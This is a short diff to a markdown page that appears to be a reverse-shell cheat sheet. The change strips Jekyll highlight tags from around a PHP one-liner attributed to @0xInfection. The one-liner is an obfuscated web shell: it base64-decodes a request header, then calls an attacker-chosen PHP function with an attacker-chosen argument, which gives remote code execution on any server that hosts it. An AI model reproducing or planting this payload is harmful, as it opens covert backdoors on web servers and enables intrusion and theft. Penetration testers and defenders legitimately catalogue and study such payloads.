@@ -100,9 +100,7 @@ Another PHP reverse shell (that was submitted via Twitter):
 
 Base64 encrypted by @0xInfection: 
 
-{% highlight bash %}
 <?=$x=explode('~',base64_decode(substr(getallheaders()['x'],1)));@$x[0]($x[1]);
-{% endhighlight %}
 
 ## Netcat Reverse Shell
 
